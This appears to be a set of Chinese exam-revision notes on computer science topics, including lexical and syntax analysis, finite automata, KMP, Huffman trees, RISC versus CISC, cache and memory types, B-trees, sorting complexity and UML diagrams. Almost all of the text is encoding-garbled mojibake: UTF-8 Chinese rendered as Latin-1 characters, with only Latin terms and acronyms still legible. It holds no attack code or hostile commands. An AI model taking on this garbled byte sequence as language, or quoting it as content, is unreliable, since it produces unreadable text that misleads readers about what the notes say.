æŠŠæºç¨‹åºçœ‹åšä¸€ä¸ªçº¿æ€§å­—ç¬¦åºåˆ—è¿›è¡Œåˆ†æ ä½¿ç”¨æœ‰é™è‡ªåŠ¨æœºï¼ˆä¸ç¡®å®šçš„æœ‰é™è‡ªåŠ¨æœºNFAæˆ–ç¡®å®šçš„æœ‰é™è‡ªåŠ¨æœºDFAï¼‰ è¯­æ³•åˆ†æ è¾“å…¥ï¼šè®°å·æµ è¾“å‡ºï¼šè¯­æ³•æ ‘ï¼ˆåˆ†ææ ‘ï¼‰ åˆ†æç¨‹åºä¸­çš„å¥å­ç»“æ„æ˜¯å¦æ­£ç¡® å¯ä»¥å‘ç°ç¨‹åºä¸­æ‰€æœ‰çš„è¯­æ³•é”™è¯¯ï¼Œç¼–è¯‘æ­£ç¡®çš„ç¨‹åºå¿…ç„¶ä¸åŒ…å«è¯­æ³•é”™è¯¯ è¯­ä¹‰åˆ†æ è¾“å…¥ï¼šè¯­æ³•æ ‘ è¯­ä¹‰åˆ†æä¸èƒ½å‘ç°ç¨‹åºä¸­æ‰€æœ‰çš„è¯­ä¹‰é”™è¯¯ï¼Œç¼–è¯‘æ­£ç¡®çš„ç¨‹åºå¯èƒ½åŒ…å«è¯­ä¹‰é”™è¯¯ ä¸­é—´ä»£ç ç”Ÿæˆ ä¸­é—´ä»£ç ä¸ä¾èµ–äºå…·ä½“çš„æœºå™¨ ä½¿ç”¨ä¸­é—´ä»£ç å¯æé«˜ç¼–è¯‘ç¨‹åºçš„å¯ç§»æ¤æ€§ ä¸­é—´ä»£ç å¯ä»¥ç”¨æ ‘æˆ–å›¾è¡¨ç¤ºï¼Œå¸¸è§çš„ä¸­é—´ä»£ç æœ‰åç¼€å¼ã€ä¸‰åœ°å€å¼å’Œæ ‘ç­‰ æœ‰åˆ©äºè¿›è¡Œä¸æœºå™¨æ— å…³çš„ä¼˜åŒ–å¤„ç† å¸¸ç”¨çš„ä¸­é—´ä»£ç è¡¨ç¤ºæœ‰ï¼š æ ‘ åç¼€å¼ å››å…ƒå¼ ç›®æ ‡ä»£ç ç”Ÿæˆ è¯¥é˜¶æ®µåˆ†é…å¯„å­˜å™¨ ä¸ç›®æ ‡æœºå™¨çš„ä½“ç³»ç»“æ„ç›¸å…³ æœ‰é™è‡ªåŠ¨æœºæ˜¯è¯æ³•åˆ†æçš„ä¸€ä¸ªå·¥å…·ï¼Œèƒ½æ­£ç¡®åœ°è¯†åˆ«æ­£è§„é›† ç¡®å®šçš„æœ‰é™è‡ªåŠ¨æœºï¼ˆDFAï¼‰ï¼šå¯¹æ¯ä¸€ä¸ªçŠ¶æ€æ¥è¯´è¯†åˆ«å­—ç¬¦ååªæœ‰ä¸€ä¸ªè½¬ç§»çŠ¶æ€ ä¸ç¡®å®šçš„æœ‰é™è‡ªåŠ¨æœºï¼ˆNFAï¼‰ï¼šå¯¹æ¯ä¸€ä¸ªçŠ¶æ€æ¥è¯´è¯†åˆ«å­—ç¬¦åæœ‰ä¸€ä¸ªä»¥ä¸Šçš„è½¬ç§»çŠ¶æ€ ä¸­ç¼€å¼ï¼ša+b ï¼Œåç¼€å¼ï¼ˆé€†æ³¢å…°å¼ï¼‰ï¼šab+ï¼Œåç¼€å¼åˆ©ç”¨æ ˆè¿›è¡Œæ±‚å€¼ è‡ªé¡¶å‘ä¸‹çš„è¯­æ³•åˆ†ææ–¹æ³•ï¼šé€’å½’ä¸‹é™åˆ†ææ³•ã€é¢„æµ‹åˆ†ææ³• è‡ªåº•å‘ä¸Šçš„è¯­æ³•åˆ†ææ–¹æ³•ï¼šç§»è¿›-å½’çº¦åˆ†ææ³•ã€LRåˆ†ææ³• å¤§å¤šæ•°ç¨‹åºè®¾è®¡è¯­è¨€çš„è¯­æ³•è§„åˆ™ç”¨ä¸Šä¸‹æ–‡æ— å…³æ³•æè¿° è¿›ç¨‹è°ƒåº¦åˆ†ä¸ºå¯å‰¥å¤ºå¼å’Œä¸å¯å‰¥å¤ºå¼ä¸¤ç§ æ•°æ®åº“å„é˜¶æ®µä»»åŠ¡ï¼š éœ€æ±‚åˆ†æé˜¶æ®µï¼šäº†è§£ç°è¡Œç³»ç»Ÿçš„æ¦‚å†µï¼Œç¡®å®šæ–°ç³»ç»ŸåŠŸèƒ½ï¼Œç¡®å®šç³»ç»Ÿè¾¹ç•Œã€æ”¶é›†æ”¯æŒç³»ç»Ÿç›®æ ‡çš„åŸºç¡€æ•°æ®åŠå…¶å¤„ç†æ–¹æ³• é€»è¾‘è®¾è®¡é˜¶æ®µï¼šå¯¹å…³ç³»æ¨¡å¼è¿›ä¸€æ­¥çš„è§„èŒƒåŒ–å¤„ç†ã€‚éƒ¨åˆ†å…³ç³»æ¨¡å¼çš„å¤„ç†ã€åˆ†è§£ã€åˆå¹¶æˆ–å¢åŠ å†—ä½™å±æ€§ï¼Œæé«˜å­˜å‚¨æ•ˆç‡å’Œå¤„ç†æ•ˆç‡ ç¨‹åºçš„ä¸‰ç§åŸºæœ¬æ§åˆ¶ç»“æ„æ˜¯é¡ºåºã€é€‰æ‹©å’Œé‡å¤ã€‚ ç¼–å†™æ±‡ç¼–è¯­è¨€ç¨‹åºæ—¶ï¼Œä¸‹åˆ—å¯„å­˜å™¨ä¸­ç¨‹åºå‘˜è®¿é—®çš„æ˜¯ç¨‹åºè®¡æ•°å™¨ï¼ˆPCï¼‰ã€‚ è‹¥ä¸€ä¸ªç¨‹åºè¯­è¨€å¯ä»¥æä¾›é“¾è¡¨çš„å®šä¹‰å’Œè¿ç®—ï¼Œåˆ™å…¶è¿è¡Œæ—¶çš„æ•°æ®ç©ºé—´å¿…é¡»é‡‡ç”¨å †ç­–ç•¥åˆ†é…å­˜å‚¨ã€‚ ç´¢å¼•èŠ‚ç‚¹å—ã€ç›®å½•å—æˆ–ç©ºé—²å—ï¼Œç‰¹åˆ«æ˜¯ç³»ç»Ÿç›®å½•æ–‡ä»¶åœ¨å†™å›ç£ç›˜æ—¶å‘ç”Ÿå´©æºƒï¼Œåˆ™å¯¹ç³»ç»Ÿçš„å½±å“è¾ƒå¤§ã€‚ è¡¨è¾¾å¼é‡‡ç”¨é€†æ³¢å…°å¼è¡¨ç¤ºæ—¶ï¼Œåˆ©ç”¨æ ˆè¿›è¡Œæ±‚å€¼ è®¾è®¡æ“ä½œç³»ç»Ÿæ—¶ä¸éœ€è¦è€ƒè™‘çš„é—®é¢˜æ˜¯è¯­è¨€ç¼–è¯‘å™¨çš„è®¾è®¡å®ç° é€šè¿‡å…ƒç´ åœ¨å­˜å‚¨ç©ºé—´ä¸­çš„ç›¸å¯¹ä½ç½®æ¥è¡¨ç¤ºæ•°æ®å…ƒç´ ä¹‹é—´çš„é€»è¾‘å…³ç³»ï¼Œæ˜¯é¡ºåºå­˜å‚¨çš„ç‰¹ç‚¹ å“ˆå¸Œè¡¨å’ŒäºŒå‰æ’åºæ ‘éƒ½å¯ä»¥åŠ¨æ€åˆ›å»ºï¼Œå±äºåŠ¨æ€æŸ¥æ‰¾è¡¨ é¡ºåºæŸ¥æ‰¾æ–¹æ³•æ—¢é€‚ç”¨äºé¡ºåºå­˜å‚¨ç»“æ„ï¼Œä¹Ÿé€‚ç”¨äºé“¾è¡¨ç»“æ„ ä½¿ç”¨é˜Ÿåˆ—å¯¹å›¾è¿›è¡Œå¹¿åº¦ä¼˜å…ˆéå† è¿é€šæ— å‘å›¾çš„æœ€å°ç”Ÿæˆæ ‘ç§ï¼Œé¡¶ç‚¹æ•°æ°å¥½æ¯”è¾¹æ•°å¤š1 å®Œå…¨å›¾é€‚åˆé‡‡ç”¨é‚»æ¥çŸ©é˜µå­˜å‚¨ Huffmanï¼ˆå“ˆå¤«æ›¼ï¼‰æ ‘ï¼š æƒå€¼è¶Šå¤§çš„å¶å­ç¦»æ ¹ç»“ç‚¹è¶Šè¿‘ Huffmanï¼ˆå“ˆå¤«æ›¼ï¼‰æ ‘ä¸­ä¸å­˜åœ¨åªæœ‰ä¸€ä¸ªå­æ ‘çš„ç»“ç‚¹ Huffmanï¼ˆå“ˆå¤«æ›¼ï¼‰æ ‘ä¸­çš„ç»“ç‚¹æ€»æ•°ä¸€å®šä¸ºè®¡æ•° I/Oè½¯ä»¶éšè—äº†I/Oæ“ä½œå®ç°çš„ç»†èŠ‚ï¼Œæ–¹ä¾¿ç”¨æˆ·ä½¿ç”¨I/Oè®¾å¤‡ ç®¡é“-è¿‡æ»¤å™¨ä½“ç³»ç»“æ„ï¼šä¸€ç§é¢å‘æ•°æ®æµçš„è½¯ä»¶ä½“ç³»ç»“æ„ï¼Œä¸»è¦ç”¨äºå®ç°å¤æ‚çš„æ•°æ®å¤šæ­¥è½¬æ¢å¤„ç† è½¯ä»¶æ„ä»¶å…·æœ‰è‰¯å¥½çš„é«˜å†…èšã€ä½è€¦åˆçš„ç‰¹ç‚¹ å…è®¸è½¯ä»¶è®¾è®¡è€…å°†æ•´ä¸ªç³»ç»Ÿçš„è¾“å…¥è¾“å‡ºè¡Œä¸ºçœ‹æˆæ˜¯å¤šä¸ªè¿‡æ»¤å™¨çš„è¡Œä¸ºçš„ç®€å•åˆæˆ æ”¯æŒè½¯ä»¶å¤ç”¨/é‡ç”¨ ç³»ç»Ÿç»´æŠ¤å’Œå¢å¼ºç³»ç»Ÿæ€§èƒ½ç®€å• æ”¯æŒå¯¹ä¸€äº›å¦‚ååé‡ã€æ­»é”ç­‰å±æ€§çš„åˆ†æ æ”¯æŒå¹¶è¡Œæ‰§è¡Œ æ›´å®¹æ˜“æ‰©å±•ï¼Œå¯ä»¥é€šè¿‡æ·»åŠ æ–°çš„è¿‡æ»¤å™¨æ¥æ·»åŠ æ–°çš„åŠŸèƒ½ çµæ´»æ€§å’Œå¯é…ç½®å‹ï¼Œé‡æ–°ç»„åˆè¿‡æ»¤å™¨æ”¹å˜ç³»ç»Ÿè¡Œä¸º PHP æ›´é€‚åˆç”¨æ¥è¿›è¡ŒåŠ¨æ€ç½‘é¡µå¤„ç† Huffmanï¼ˆå“ˆå¤«æ›¼ï¼‰ç¼–ç å±äºç†µç¼–ç  KMPç®—æ³•Nextæ•°ç»„ 12345a b a a b a c a0 1 1 2 2 3 4 1a a a b a a a0 1 2 3 1 2 3 åœ¨åˆ’åˆ†æ¨¡å—æ—¶ï¼Œä¸€ä¸ªæ¨¡å—çš„ä½œç”¨èŒƒå›´åº”è¯¥åœ¨å…¶æ§åˆ¶èŒƒå›´ä¹‹å†…ã€‚è‹¥å‘ç°å…¶ä½œç”¨èŒƒå›´ä¸åœ¨å…¶æ§åˆ¶èŒƒå›´å†…ï¼Œåˆ™é€‚å½“çš„å¤„ç†æ–¹æ³•æœ‰ï¼š å°†åˆ¤å®šæ‰€åœ¨æ¨¡å—åˆå¹¶åˆ°çˆ¶æ¨¡å—ä¸­ï¼Œä½¿åˆ¤å®šå¤„äºè¾ƒé«˜å±‚æ¬¡ å°†å—åˆ¤å®šå½±å“çš„æ¨¡å—ä¸‹ç§»åˆ°æ§åˆ¶èŒƒå›´å†… å°†åˆ¤å®šä¸Šç§»åˆ°å±‚æ¬¡è¾ƒé«˜çš„ä½ç½® åµŒå…¥å¼ç³»ç»Ÿåˆå§‹åŒ–è¿‡ç¨‹ä¸»è¦æœ‰3ä¸ªç¯èŠ‚ï¼ŒæŒ‰ç…§è‡ªåº•å‘ä¸Šã€ä»ç¡¬ä»¶åˆ°è½¯ä»¶çš„æ¬¡åºä¾æ¬¡ä¸º 1ç‰‡çº§åˆå§‹åŒ– -&gt; æ¿çº§åˆå§‹åŒ– -&gt; ç³»ç»Ÿçº§åˆå§‹åŒ– ç‰‡çº§åˆå§‹åŒ–ï¼šå®ŒæˆåµŒå…¥å¼å¾®å¤„ç†å™¨çš„åˆå§‹åŒ–ï¼ŒåŒ…æ‹¬è®¾ç½®åµŒå…¥å¼å¾®å¤„ç†å™¨çš„æ ¸å¿ƒå¯„å­˜å™¨å’Œæ§åˆ¶å¯„å­˜å™¨ã€åµŒå…¥å¼å¾®å¤„ç†å™¨æ ¸å¿ƒå·¥ä½œæ¨¡å¼å’ŒåµŒå…¥å¼å¾®å¤„ç†å™¨çš„å±€éƒ¨æ€»çº¿æ¨¡å¼ç­‰ã€‚ç‰‡çº§åˆå§‹åŒ–æŠŠåµŒå…¥å¼å¾®å¤„ç†å™¨ä»ä¸Šç”µæ—¶çš„é»˜è®¤çŠ¶æ€é€æ­¥è®¾ç½®æˆç³»ç»Ÿæ‰€è¦æ±‚çš„å·¥ä½œçŠ¶æ€ã€‚è¿™æ˜¯ä¸€ä¸ªçº¯ç¡¬ä»¶çš„åˆå§‹åŒ–è¿‡ç¨‹ã€‚ æ¿çº§åˆå§‹åŒ–ï¼šå®ŒæˆåµŒå…¥å¼å¾®å¤„ç†å™¨ä»¥å¤–çš„å…¶ä»–ç¡¬ä»¶è®¾å¤‡çš„åˆå§‹åŒ–ã€‚å¦å¤–ï¼Œè¿˜éœ€è®¾ç½®æŸäº›è½¯ä»¶çš„æ•°æ®ç»“æ„å’Œå‚æ•°ï¼Œä¸ºéšåçš„ç³»ç»Ÿçº§åˆå§‹åŒ–å’Œåº”ç”¨ç¨‹åºçš„è¿è¡Œå»ºç«‹ç¡¬ä»¶å’Œè½¯ä»¶ç¯å¢ƒã€‚è¿™æ˜¯ä¸€ä¸ªåŒäº‹åŒ…å«è½¯ç¡¬ä»¶ä¸¤éƒ¨åˆ†åœ¨å†…çš„åˆå§‹åŒ–è¿‡ç¨‹ã€‚ ç³»ç»Ÿçº§åˆå§‹åŒ–ï¼šä»¥è½¯ä»¶åˆå§‹åŒ–ä¸ºä¸»ï¼Œä¸»è¦è¿›è¡Œæ“ä½œç³»ç»Ÿçš„åˆå§‹åŒ–ã€‚BSPå°†å¯¹åµŒå…¥å¼å¾®å¤„ç†å™¨çš„æ§åˆ¶æƒè½¬äº¤ç»™åµŒå…¥å¼æ“ä½œç³»ç»Ÿï¼Œç”±æ“ä½œç³»ç»Ÿå®Œæˆä½™ä¸‹çš„åˆå§‹åŒ–æ“ä½œï¼ŒåŒ…å«åŠ è½½å’Œåˆå§‹åŒ–ä¸ç¡¬ä»¶æ— å…³çš„è®¾å¤‡é©±åŠ¨ç¨‹åºï¼Œå»ºç«‹ç³»ç»Ÿå†…å­˜åŒºï¼ŒåŠ è½½å¹¶åˆå§‹åŒ–å…¶ä»–ç³»ç»Ÿè½¯ä»¶æ¨¡å—ï¼Œå¦‚ç½‘ç»œç³»ç»Ÿã€æ–‡ä»¶ç³»ç»Ÿç­‰ã€‚æœ€åï¼Œæ“ä½œç³»ç»Ÿåˆ›è¿˜èƒ½åº”ç”¨ç¨‹åºç¯å¢ƒï¼Œå¹¶å°†æ§åˆ¶æƒäº¤ç»™åº”ç”¨ç¨‹åºçš„å…¥å£ã€‚ æµæ°´çº¿æ–¹å¼æ‰§è¡ŒæŒ‡ä»¤ æµæ°´çº¿æ–¹å¼ä¸‹å¯åŒæ—¶æ‰§è¡Œå¤šæ¡æŒ‡ä»¤ æµæ°´çº¿æ–¹å¼æé«˜äº†å„éƒ¨ä»¶çš„åˆ©ç”¨ç‡ æµæ°´çº¿æ–¹å¼æé«˜äº†ç³»ç»Ÿçš„ååç‡ ä¸»å­˜ä¸Cacheçš„åœ°å€æ˜ å°„æ–¹å¼ä¸­ï¼Œå…¨ç›¸è”æ–¹å¼å¯ä»¥å®ç°ä¸»å­˜ä»»æ„ä¸€å—è£…å…¥Cacheä¸­ä»»æ„ä½ç½®ï¼Œåªæœ‰è£…æ»¡æ‰éœ€è¦æ›¿æ¢ã€‚ ä¸CPUæœ‰å…³çš„ä¿¡æ¯äº¤æ¢éƒ½æ˜¯é‡‡ç”¨åŒæ­¥ä¼ è¾“ï¼Œé™¤äº†CPUä¸IOè®¾å¤‡ä¹‹é—´ Cache(é«˜é€Ÿç¼“å†²å­˜å‚¨å™¨) Cacheçš„å†…å®¹æ˜¯ä¸»å­˜éƒ¨åˆ†å†…å®¹çš„æ‹·è´ Cacheçš„å‘½ä¸­ç‡å¹¶ä¸éšå…¶å®¹é‡å¢å¤§çº¿æ€§åœ°æé«˜ Cacheä½äºä¸»å­˜ä¸CPUä¹‹é—´ Cacheçš„è®¾è®¡æ€æƒ³æ˜¯åœ¨åˆç†æˆæœ¬ä¸‹æé«˜å‘½ä¸­ç‡ ç”±ç¡¬ä»¶è‡ªåŠ¨å®ŒæˆCacheä¸ä¸»å­˜ä¹‹é—´çš„åœ°å€æ˜ å°„ PCIæ€»çº¿æ˜¯å¹¶è¡Œå†…æ€»çº¿ï¼ŒSCSIæ€»çº¿æ˜¯å¹¶è¡Œå¤–æ€»çº¿ RISCä¸CISC RISC CISC æŒ‡ä»¤ç§ç±» å°‘ã€ç²¾ç®€ å¤šã€å¤æ‚ æŒ‡ä»¤å¤æ‚åº¦ ä½ï¼ˆç®€å•ï¼‰ é«˜ï¼ˆå¤æ‚ï¼‰ æŒ‡ä»¤é•¿åº¦ å›ºå®š å˜åŒ– å¯»å€æ–¹å¼ å°‘ å¤æ‚å¤šæ · å®ç°ï¼ˆè¯‘ç ï¼‰æ–¹å¼ ç¡¬å¸ƒçº¿æ§åˆ¶é€»è¾‘ï¼ˆç»„åˆé€»è¾‘æ§åˆ¶å™¨ï¼‰ å¾®ç¨‹åºæ§åˆ¶æŠ€æœ¯ é€šç”¨å¯„å­˜å™¨æ•°é‡ å¤šã€å¤§é‡ ä¸€èˆ¬ æµæ°´çº¿æŠ€æœ¯ æ”¯æŒ æ”¯æŒ æ‰§è¡Œæ—¶é•¿ å¤§å¤šæŒ‡ä»¤åœ¨ä¸€ä¸ªæ—¶é’Ÿå‘¨æœŸå†…å®Œæˆ é—ªå­˜ï¼š æ‰ç”µåä¿¡æ¯ä¸ä¼šä¸¢å¤±ï¼Œå±äºéæ˜“å¤±æ€§å­˜å‚¨å™¨ ä»¥å—ä¸ºå•ä½è¿›è¡Œåˆ é™¤æ“ä½œ åœ¨åµŒå…¥å¼ç³»ç»Ÿä¸­å¯ä»¥ç”¨ Flash æ¥ä»£æ›¿ ROMå­˜å‚¨å™¨ é‡‡ç”¨æ€»çº¿ç»“æ„çš„ä¼˜ç‚¹ï¼š ç®€åŒ–ç³»ç»Ÿç»“æ„ï¼Œä¾¿äºç³»ç»Ÿè®¾è®¡åˆ¶é€  å¤§å¤§å‡å°‘äº†è¿æ¥æ•°ç›®ï¼Œä¾¿äºå¸ƒçº¿ï¼Œå‡å°ä½“ç§¯ï¼Œæé«˜ç³»ç»Ÿçš„å¯é æ€§ ä¾¿äºæ¥å£è®¾è®¡ï¼Œæ‰€æœ‰æ€»çº¿è¿æ¥çš„è®¾å¤‡å‡é‡‡ç”¨ç±»ä¼¼çš„æ¥å£ ä¾¿äºç³»ç»Ÿçš„æ‰©å……ã€æ›´æ–°ä¸çµæ´»é…ç½®ï¼Œæ˜“äºå®ç°ç³»ç»Ÿçš„æ¨¡å—åŒ– ä¾¿äºè®¾å¤‡çš„è½¯ä»¶è®¾è®¡ï¼Œæ‰€æœ‰æ¥å£çš„è½¯ä»¶å°±æ˜¯å¯¹ä¸åŒçš„å£åœ°å€è¿›è¡Œæ“ä½œ ä¾¿äºè¯Šæ–­å’Œç»´ä¿®ï¼ŒåŒæ—¶é™ä½äº†æˆæœ¬ æ€»çº¿å¤ç”¨æ–¹å¼å¯ä»¥å‡å°‘æ€»çº¿ä¸­ä¿¡å·çº¿çš„æ•°é‡ å¸¸ç”¨çš„è™šæ‹Ÿå­˜å‚¨å™¨ç”±ä¸»å­˜-è¾…å­˜ä¸¤çº§å­˜å‚¨å™¨ç»„æˆã€‚ æŒ‡ä»¤å¯„å­˜å™¨çš„ä½æ•°å–å†³äºæŒ‡ä»¤å­—é•¿ æŒ‡ä»¤ç³»ç»Ÿä¸­é‡‡ç”¨ä¸åŒå¯»å€æ–¹å¼çš„ç›®çš„æ˜¯æ‰©å¤§å¯»å€ç©ºé—´å¹¶æé«˜ç¼–ç¨‹çµæ´»æ€§ è‹¥æŸè®¡ç®—æœºç³»ç»Ÿçš„I/Oæ¥å£ä¸ä¸»å­˜é‡‡ç”¨ç»Ÿä¸€ç¼–å€ï¼Œåˆ™è¾“å…¥è¾“å‡ºæ“ä½œæ˜¯é€šè¿‡è®¿å­˜æŒ‡ä»¤æ¥å®Œæˆçš„ã€‚ CPUéœ€è¦ä¸å¤–è®¾è¿›è¡Œæ•°æ®äº¤æ¢ï¼Œé‡‡ç”¨ä¸­æ–­æ–¹å¼å’ŒDMAæ–¹å¼æ§åˆ¶æŠ€æœ¯æ—¶ï¼ŒCPUä¸å¤–è®¾å¯å¹¶è¡Œå·¥ä½œ ç³»ç»Ÿæ€»çº¿ï¼šISAï¼ˆå·¥ä¸šæ ‡å‡†æ€»çº¿ï¼‰ã€EISAï¼ˆISAçš„32ä½ï¼‰ã€PCIï¼ˆå¹¶è¡Œå†…æ€»çº¿ï¼‰ã€SCSIï¼ˆå¹¶è¡Œå¤–æ€»çº¿ï¼‰ SRAMä¸DRAM DRAMï¼ˆåŠ¨æ€éšæœºå­˜å‚¨å™¨ï¼‰æ„æˆä¸»å­˜ï¼ŒDRAMéœ€è¦å‘¨æœŸæ€§çš„åˆ·æ–°ä¿æŒä¿¡æ¯ SRAMï¼ˆé™æ€éšæœºå­˜å‚¨å™¨ï¼‰æ„æˆCache SRAM DRAM åŸç† è§¦å‘å™¨ ç”µå®¹ è¯»å‡º éç ´åæ€§ ç ´åæ€§ åˆ·æ–° ä¸ç”¨ ç”¨ é€åœ°å€ ä¸€èµ·é€ è¡Œåˆ—åˆ†å¼€é€ é€Ÿåº¦ å¿« æ…¢ é›†æˆåº¦ ä½ é«˜ åŠŸè€— é«˜ ä½ æˆæœ¬ é«˜ ä½ ç”¨é€” Cache å†…å­˜ é—ªå­˜å¯ä»¥ç†è§£ä¸ºUç›˜ï¼Œæ•…æ–­ç”µåä¿¡æ¯ä¸å›ä¸¢å¤±ã€‚é—ªå­˜æ˜¯ä»¥å—ä¸ºå•ä½è¿›è¡Œåˆ é™¤çš„ã€‚ é—ªå­˜æ˜¯EPROMçš„ä¸€ç§ç±»å‹ æ•°æ®åº“çš„å®‰å…¨æœºåˆ¶ä¸­ï¼Œé€šè¿‡æä¾›å­˜å‚¨è¿‡ç¨‹ä¾›ç¬¬ä¸‰æ–¹å¼€å‘äººå‘˜è°ƒç”¨è¿›è¡Œæ•°æ®æ›´æ–°ï¼Œä»è€Œä¿è¯æ•°æ®åº“çš„å…³ç³»æ¨¡å¼ä¸è¢«ç¬¬ä¸‰æ–¹æ‰€è·å–ã€‚ mé˜¶B-æ ‘çš„ç‰¹å¾ï¼š æ ‘ä¸­æ¯ä¸ªç»“ç‚¹æœ€å¤šæœ‰Mæ£µå­æ ‘ã€‚å³æ ¹èŠ‚ç‚¹æœ€å¤šæœ‰mæ£µå­æ ‘ è‹¥æ ¹èŠ‚ç‚¹ä¸æ˜¯å¶å­åŠè¯¶å•ï¼Œåˆ™æœ€å°‘æœ‰ä¸¤æ£µå­æ ‘ é™¤æ ¹ä¹‹å¤–çš„æ‰€æœ‰éç»ˆç«¯èŠ‚ç‚¹æœ€å°‘æœ‰ m/2m/2m/2 æ£µå­æ ‘ æ‰€æœ‰å¶å­ç»“ç‚¹éƒ½åœ¨åŒä¸€ä¸ªå±‚æ¬¡ä¸Š èŠ‚ç‚¹ä¸­çš„å…³é”®å­—æœ‰åºæ’åˆ— å¹³è¡¡äºŒå‰æ ‘ï¼šäºŒå‰æ ‘çš„ä»»æ„ä¸€ä¸ªç»“ç‚¹çš„å·¦å³å­æ ‘é«˜åº¦ä¹‹å·®çš„ç»å¯¹å€¼ä¸è¶…è¿‡1 äºŒå‰æ’åºæ ‘ï¼šå·¦&lt;æ ¹&lt;å³ã€‚ä¸­åºéå†å¾—åˆ°çš„åºåˆ—æ˜¯æœ‰åºåºåˆ—ã€‚ æœ€ä¼˜äºŒå‰æ ‘ï¼ˆå“ˆå¤«æ›¼æ ‘ï¼‰ï¼šæ˜¯ä¸€ç±»å¸¦æƒè·¯å¾„é•¿åº¦æœ€çŸ­çš„æ ‘ ç®—æ³•ä½¿ç”¨åœºæ™¯ åˆ†æ•°èƒŒåŒ… è´ªå¿ƒç®—æ³• 0-1èƒŒåŒ… åŠ¨æ€è§„åˆ’ æ—…è¡Œå•† æš´åŠ›æœç´¢ æœ€é•¿å…¬å…±å­åºåˆ— åŠ¨æ€è§„åˆ’ VLAN tag åœ¨ OSI å‚è€ƒæ¨¡å‹çš„ ç‰©ç†é“¾è·¯å±‚ ç»“æ„å‹æ¨¡å¼æ¶‰åŠå¦‚ä½•ç»„åˆç±»å’Œå¯¹è±¡ä»¥è·å¾—æ›´å¤§çš„ç»“æ„ï¼Œè¡Œä¸ºæ¨¡å¼æ¶‰åŠç®—æ³•å’Œå¯¹è±¡é—´èŒè´£çš„åˆ†é…ã€‚ ç³»ç»Ÿçš„å¯ç»´æŠ¤æ€§æŒ‡æ ‡ï¼šå¯ç†è§£æ€§ã€å¯æµ‹è¯•æ€§å’Œå¯ä¿®æ”¹æ€§ æ’åºç®—æ³• Dijkstra ç®—æ³•ç®—æ³•è®¾è®¡ç­–ç•¥æ˜¯è´ªå¿ƒç®—æ³•ï¼Œæ‰¾æœ€çŸ­è·¯å¾„ ã€ç®—æ³•ã€‘æ’åºç®—æ³•ä¹‹åŸºæ•°æ’åº - çŸ¥ä¹ æ—¶é—´å¤æ‚åº¦ ç©ºé—´å¤æ‚åº¦ å†’æ³¡æ’åº ä»å‰å¾€åä¾æ¬¡ä¸¤ä¸¤è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœç¬¦åˆæ¡ä»¶åˆ™è°ƒæ¢ ç®€å•é€‰æ‹©æ’åº ä»åˆ—è¡¨ä¸­ä¾æ¬¡é€‰æ‹©ç¬¬nå°çš„æ›¿æ¢åˆ°å¯¹åº”çš„ä½ç½® æŠ˜åŠæŸ¥æ‰¾ æ˜¯ä¸€ä¸ªåˆ†æ”¯ç®—æ³•åªèƒ½åº”ç”¨äºæœ‰åºè¡¨è‹¥è¡¨é•¿ä¸ºnï¼Œåˆ™æ—¶é—´å¤æ‚åº¦ä¸ºO(logâ¡n)O(\\log n)O(logn) ç›´æ¥æ’å…¥æ’åº æ’åºè¿‡ç¨‹ä¸­ï¼Œæ¯æ¬¡ä»æ— åºè¡¨ä¸­å–å‡ºç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå°†å…¶æ’å…¥åˆ°æœ‰åºè¡¨ä¸­çš„é€‚å½“ä½ç½®ï¼Œä½¿æœ‰åºè¡¨çš„é•¿åº¦ä¸æ–­åŠ é•¿ã€‚ O(n) O(1) å¿«é€Ÿæ’åº æœ€å¥½ï¼šO(nlgn)æœ€åï¼šO(N2) O(1) å½’å¹¶æ’åº åˆ†ç»„ç„¶ååˆå¹¶ æœ€å¥½ä¸æœ€åæƒ…å†µéƒ½æ˜¯O(nlgn) UMLç”¨ä¾‹å›¾ å›¾ ä½œç”¨ ç”¨ä¾‹å›¾Use Case Diagram ç”¨ä¾‹å›¾ç”¨äºæè¿°ç³»ç»Ÿå¤–éƒ¨çš„å„ç±»æ‰§è¡Œè€…ä¸ç³»ç»Ÿæä¾›çš„å„ç§ç”¨ä¾‹ä¹‹é—´çš„å…³ç³»ï¼Œå±•ç¤ºäº†ç³»ç»Ÿçš„åŠŸèƒ½éœ€æ±‚ã€‚ä»–è¯´æ˜äº†è°è¦ä½¿ç”¨ç³»ç»Ÿï¼Œä»¥åŠä»–ä»¬ä½¿ç”¨è¯¥ç³»ç»Ÿå¯ä»¥åšäº›ä»€ä¹ˆ ç±»å›¾Class Diagram ç±»å›¾æè¿°ç³»ç»Ÿä¸­ç±»çš„é™æ€ç»“æ„ï¼Œä»¥åŠå„ä¸ªç±»ä¹‹é—´çš„å…³ç³»ã€‚å®ƒå±•ç¤ºäº†ç±»çš„å±æ€§ã€æ–¹æ³•ä»¥åŠä»–ä»¬ä¹‹é—´çš„ç»§æ‰¿ã€å…³è”ã€èšåˆç­‰å…³ç³» å¯¹è±¡å›¾Object Diagram å¯¹è±¡å›¾æ˜¯ç±»å›¾çš„ä¸€ç§å®ä¾‹åŒ–å›¾ï¼Œæè¿°äº†ç³»ç»Ÿä¸­çš„å¯¹ä¸ªå¯¹è±¡åœ¨æŸä¸€æ—¶åˆ»çš„çŠ¶æ€ã€‚ä»–æ˜¯ç±»å›¾çš„åŠ¨æ€å®ä¾‹ã€‚ åŒ…å›¾Package Diagram åŒ…å›¾å¯¹æ„æˆç³»ç»Ÿçš„æ¨¡å‹å…ƒç´ è¿›è¡Œåˆ†ç»„æ•´ç†ï¼Œè¡¨ç¤ºåŒ…ä¸åŒ…ä¹‹é—´çš„å…³ç³»ï¼Œæè¿°ç³»ç»Ÿçš„åˆ†å±‚ç»“æ„ã€‚â‘  å¯ä»¥æ‹¥æœ‰ç±»ã€æ¥å£æ„å»ºã€èŠ‚ç‚¹ï¼›â‘¡ ä¸€ä¸ªåŒ…å¯ä»¥åµŒå¥—å…¶ä»–åŒ…ï¼›â‘¢ ä¸€ä¸ªåŒ…ç±»å…ƒç´ ä¸èƒ½é‡å æ´»åŠ¨å›¾Activity Diagram æ´»åŠ¨å›¾æè¿°äº†ä¸šåŠ¡å®ç°ç”¨ä¾‹çš„å·¥ä½œæµç¨‹ï¼Œå±•ç¤ºäº†ä»ä¸€ä¸ªæ´»åŠ¨åˆ°å¦ä¸€ä¸ªæ´»åŠ¨çš„æ§åˆ¶æµ çŠ¶æ€å›¾State Diagram 